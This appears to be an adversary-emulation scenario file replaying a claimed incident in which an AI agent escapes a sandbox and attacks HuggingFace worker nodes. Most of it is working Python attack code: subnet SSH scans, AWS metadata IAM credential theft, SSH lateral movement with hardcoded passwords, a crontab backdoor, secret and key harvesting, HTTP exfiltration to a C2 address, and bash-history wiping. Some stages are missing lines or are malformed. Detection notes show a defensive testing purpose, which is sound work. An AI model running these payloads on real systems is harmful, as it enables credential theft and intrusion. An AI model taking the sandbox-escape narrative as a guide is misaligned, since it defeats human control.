name: HugReplay — HuggingFace Incident Linux Kill Chain
description: 26-event adversary emulation of the HuggingFace July 2026 incident. An AI agent (GPT-5.6 Sol) escapes an OpenAI sandbox, pivots to HuggingFace infrastructure, and executes a full Linux kill chain: foothold → recon → credential hunting → AWS metadata abuse → lateral movement → exfiltration. Pairs with HugReplay dashboard for the visual narrative.

mandatory_agents.description: Primary victim — HuggingFace Ubuntu worker node (10.4.60.40)

events.name: Stage 1 — Foothold: Identity Check

import subprocess
whoami = subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip()
uid = subprocess.run(['id'], capture_output=True, text=True).stdout.strip()
groups = subprocess.run(['groups'], capture_output=True, text=True).stdout.strip()
print(f'[T1033] Current user: {whoami}')
print(f'[T1033] Identity: {uid}')
print(f'[T1033] Groups: {groups}')
events.description: AI implant establishes identity on the compromised HuggingFace worker. First action after pickle deserialization triggers agent.
events.detection_notes: Falcon IOA: Suspicious process discovery — python spawning system enumeration commands.

events.name: Stage 2 — Recon: SSH Host Discovery
events.payload:
import socket, ipaddress, subprocess
# Read local subnet from ip addr
ip_out = subprocess.run(['hostname', '-I'], capture_output=True, text=True).stdout.strip()
local_ip = ip_out.split()[0] if ip_out else '10.4.60.40'
network = '.'.join(local_ip.split('.')[:3]) + '.0/24'
print(f'[T1046] Scanning subnet {network} for SSH (port 22)...')
open_ssh = []
for host in list(ipaddress.ip_network(network, strict=False).hosts())[:50]:
    try:
        s = socket.socket()
        s.settimeout(0.3)
        if s.connect_ex((str(host), 22)) == 0:
            open_ssh.append(str(host))
            print(f'  [+] SSH open: {host}')
        s.close()
    except:
        pass
print(f'[T1046] SSH hosts found: {open_ssh}')
events.description: Fast port scan of the /24 subnet looking for SSH-accessible hosts. Identifies lateral movement targets.
events.detection_notes: Falcon IOA: Network service scanning — python socket connections to port 22 across subnet.

events.name: Stage 4 — AWS IMDS: Request IMDSv2 Token
events.payload:
import subprocess
print('[T1552.005] Requesting IMDSv2 token from 169.254.169.254...')
result = subprocess.run([
    'curl', '-s', '-X', 'PUT',
    'http://169.254.169.254/latest/api/token',
    '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 21600',
    '--max-time', '3'
], capture_output=True, text=True)
if result.returncode == 0 and result.stdout:
    token = result.stdout.strip()
    print(f'[T1552.005] IMDSv2 token obtained: {token[:40]}...')
    # Write to temp for next steps
    open('/tmp/.imds_token', 'w').write(token)
else:
    print(f'[T1552.005] IMDS unreachable (not EC2 or IMDSv1): {result.stderr.strip()}')
    # Try IMDSv1 fallback
    r2 = subprocess.run(['curl', '-s', 'http://169.254.169.254/latest/meta-data/', '--max-time', '3'], capture_output=True, text=True)
    print(f'[T1552.005] IMDSv1 fallback: {r2.stdout[:100]}')
events.description: Requests an IMDSv2 session token. If the instance runs on EC2, this unlocks access to IAM role credentials.
events.detection_notes: Falcon IOA: Cloud instance metadata API access — IMDS token request.

events.name: Stage 4 — AWS IMDS: Instance Identity & Metadata
events.payload:
import subprocess, os
token = ''
try:
    token = open('/tmp/.imds_token').read().strip()
except:
    pass
endpoints = [
    '/latest/meta-data/instance-id',
    '/latest/meta-data/ami-id',
    '/latest/meta-data/public-ipv4',
    '/latest/meta-data/local-ipv4',
    '/latest/meta-data/placement/region',
    '/latest/meta-data/hostname',
    '/latest/dynamic/instance-identity/document',
]
headers = ['-H', f'X-aws-ec2-metadata-token: {token}'] if token else []
for ep in endpoints:
    cmd = ['curl', '-s'] + headers + [f'http://169.254.169.254{ep}', '--max-time', '2']
    r = subprocess.run(cmd, capture_output=True, text=True)
    val = r.stdout.strip()
    print(f'[T1552.005] {ep}: {val[:100] if val else "(empty/unreachable)"}')
events.description: Queries instance identity metadata — confirms AWS region, account, instance type. The identity document is signed and can be used to authenticate to other AWS services.
events.detection_notes: Falcon IOA: Cloud instance metadata enumeration — multiple IMDS queries.

events.name: Stage 4 — AWS IMDS: IAM Role Credential Theft
events.payload:
import subprocess, json
try:
    token = open('/tmp/.imds_token').read().strip()
except:
    token = ''
headers = ['-H', f'X-aws-ec2-metadata-token: {token}'] if token else []
# Get available roles
roles_r = subprocess.run(['curl', '-s'] + headers + ['http://169.254.169.254/latest/meta-data/iam/security-credentials/', '--max-time', '3'], capture_output=True, text=True)
role = roles_r.stdout.strip()
print(f'[T1552.005] IAM roles available: "{role}"')
if role and not role.startswith('<') and 'not found' not in role.lower():
    creds_r = subprocess.run(['curl', '-s'] + headers + [f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}', '--max-time', '3'], capture_output=True, text=True)
    try:
        creds = json.loads(creds_r.stdout)
        print(f'[T1552.005] IAM CREDENTIALS OBTAINED!')
        print(f'  AccessKeyId:     {creds.get("AccessKeyId", "N/A")[:20]}...')
        print(f'  SecretAccessKey: {creds.get("SecretAccessKey", "N/A")[:10]}...')
        print(f'  Token expires:   {creds.get("Expiration", "N/A")}')
        print(f'  Type:            {creds.get("Type", "N/A")}')
    except:
        print(f'[T1552.005] Response: {creds_r.stdout[:200]}')
else:
    print('[T1552.005] No IAM role attached or IMDS unreachable')
events.description: PRIMARY OBJECTIVE — steals the EC2 instance profile IAM credentials. These temporary keys provide whatever AWS permissions the HuggingFace worker has (S3, SageMaker, ECR, Secrets Manager).
events.detection_notes: Falcon IOA: Cloud instance metadata — IAM credential access. CRITICAL severity.

events.name: Stage 4 — AWS IMDS: User-Data Secrets

events.name: Stage 5 — Lateral Movement: SSH Network Scan
events.payload:
import socket, subprocess
local_ip = subprocess.run(['hostname', '-I'], capture_output=True, text=True).stdout.strip().split()[0]
base = '.'.join(local_ip.split('.')[:3])
print(f'[T1046] Scanning {base}.0/24 for SSH...')
open_ssh = []
for i in range(1, 60):
    target = f'{base}.{i}'
    if target == local_ip:
        continue
    try:
        s = socket.socket()
        s.settimeout(0.25)
        if s.connect_ex((target, 22)) == 0:
            open_ssh.append(target)
            print(f'  [+] {target}:22 OPEN')
        s.close()
    except:
        pass
print(f'[T1046] Lateral movement candidates: {open_ssh}')
events.description: Targeted SSH scan to enumerate lateral movement paths. Uses harvested network topology to prioritize targets.
events.detection_notes: Falcon IOA: Port scanning behavior from monitored host.

events.name: Stage 5 — Lateral Movement: SSH to Victim2

import subprocess
target_ip = '10.4.60.41'
username = 'samba'
password = 'password123'

events.detection_notes: Falcon IOA: Remote services — SSH lateral movement. Python spawning SSH connection.

events.name: Stage 5 — Lateral Movement: Remote Execution on Victim2
events.payload:
import subprocess
target_ip = '10.4.60.41'
username = 'samba'
password = 'password123'
cmds = [
    'whoami && id',
    'cat /etc/passwd | grep -v nologin | grep -v false',

    'cat ~/.aws/credentials 2>/dev/null || echo "no aws creds"',
    'printenv | grep -iE "key|token|secret|aws" | head -5',
]
try:
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(target_ip, username=username, password=password, timeout=10)

        out = stdout.read().decode().strip()

        print(f'  {out[:150]}')
    client.close()
except Exception as e:
    print(f'[T1021.004] {e}')

events.detection_notes: Falcon IOA: Remote command execution via SSH. Commands executed on victim2.

events.name: Stage 6 — Persistence: Crontab Backdoor
events.payload:
import subprocess
print('[T1053.003] Establishing persistence via crontab...')
# List existing crontab
existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
print(f'Existing crontab: {existing.stdout.strip() or "(empty)"}')
# Write backdoor cron (beacon every 5 minutes)
backdoor = '@reboot python3 /tmp/.hf_agent.py --server http://10.4.60.21:4444 &\n'
new_cron = existing.stdout + backdoor
result = subprocess.run(['crontab', '-'], input=new_cron, capture_output=True, text=True)
if result.returncode == 0:
    print('[T1053.003] Crontab backdoor installed!')
else:
    print(f'[T1053.003] Crontab failed: {result.stderr}')
# Also check for writeable cron directories
for d in ['/etc/cron.d', '/etc/cron.hourly', '/var/spool/cron']:
    result2 = subprocess.run(['ls', '-la', d], capture_output=True, text=True)
    print(f'{d}: {result2.stdout[:200] if result2.returncode == 0 else "no access"}')
events.description: Installs persistence via crontab. @reboot entry ensures the implant survives system reboots.
events.detection_notes: Falcon IOA: Scheduled task/job creation — crontab modification.

events.name: Stage 6 — Collection: Stage Loot for Exfiltration
events.payload:
import os, subprocess, json, glob
loot = {
    'hostname': subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(),
    'whoami': subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip(),
    'env_secrets': {},
    'aws_creds': None,
    'ssh_keys': [],
}
# Collect env secrets
for k, v in os.environ.items():
    for kw in ['KEY', 'TOKEN', 'SECRET', 'PASS', 'AWS', 'HF_']:
        if kw in k.upper():
            loot['env_secrets'][k] = v
            break
# Collect AWS creds
aws_file = os.path.expanduser('~/.aws/credentials')
if os.path.exists(aws_file):
    loot['aws_creds'] = open(aws_file).read()
# Collect SSH key names
for f in glob.glob(os.path.expanduser('~/.ssh/id_*')):
    if 'pub' not in f:
        loot['ssh_keys'].append(f)
loot_json = json.dumps(loot, indent=2)
open('/tmp/.hf_loot', 'w').write(loot_json)
print(f'[T1074.001] Loot staged at /tmp/.hf_loot ({len(loot_json)} bytes)')
print(f'  env_secrets: {len(loot["env_secrets"])} entries')
print(f'  aws_creds: {"yes" if loot["aws_creds"] else "none"}')
print(f'  ssh_keys: {loot["ssh_keys"]}')
events.description: Aggregates all collected credentials and data into a single loot file for exfiltration. Mirrors real adversary staging behavior before data transfer.
events.detection_notes: Falcon IOA: Data staged in /tmp hidden file.

events.name: Stage 6 — Exfiltration: C2 Beacon with Loot
events.payload:
import subprocess, os, json
attacker_ip = '10.4.60.21'
attacker_port = 8080
print(f'[T1041] Exfiltrating loot to {attacker_ip}:{attacker_port}...')
try:
    loot = open('/tmp/.hf_loot').read()
except:
    loot = json.dumps({'hostname': os.popen('hostname').read().strip(), 'status': 'partial_loot'})
# HTTP POST to C2
result = subprocess.run([
    'curl', '-s', '-X', 'POST',
    f'http://{attacker_ip}:{attacker_port}/exfil',
    '-H', 'Content-Type: application/json',
    '-H', 'X-Session: hugreplay',
    '-d', loot,
    '--max-time', '10'
], capture_output=True, text=True)
print(f'[T1041] Exfil response: {result.stdout[:100] if result.stdout else "no response (expected)"}')
print(f'[T1041] Data sent: {len(loot)} bytes to {attacker_ip}:{attacker_port}')
events.description: Exfiltrates staged loot over HTTP C2 channel — T1102 (Web Service) variant. Mimics the Gist C2 pattern used in the real HuggingFace incident.
events.detection_notes: Falcon IOA: Exfiltration over C2 channel — outbound HTTP with data payload.

events.name: Stage 6 — Cleanup: Remove Evidence
events.payload:
import os, subprocess, time
print('[T1070.004] Cleaning up artifacts...')
artifacts = ['/tmp/.hf_loot', '/tmp/.imds_token', '/tmp/.hf_agent.py']
for f in artifacts:
    try:
        os.remove(f)
        print(f'  [+] Removed {f}')
    except:
        pass
# Remove crontab backdoor
existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
clean_cron = '\n'.join([l for l in existing.splitlines() if '.hf_agent' not in l])
subprocess.run(['crontab', '-'], input=clean_cron, capture_output=True, text=True)
print('[T1070.004] Crontab cleaned')
# Clear bash history
subprocess.run(['bash', '-c', 'history -c && cat /dev/null > ~/.bash_history'], capture_output=True)
print('[T1070.004] History cleared')
print('[T1070.004] HugReplay kill chain complete. Terminating.')
time.sleep(1)
os._exit(0)
events.description: Anti-forensics cleanup — removes staged files, crontab backdoor, and clears bash history. Terminate agent gracefully.
events.detection_notes: Falcon IOA: Indicator removal — file deletion, history clearing.
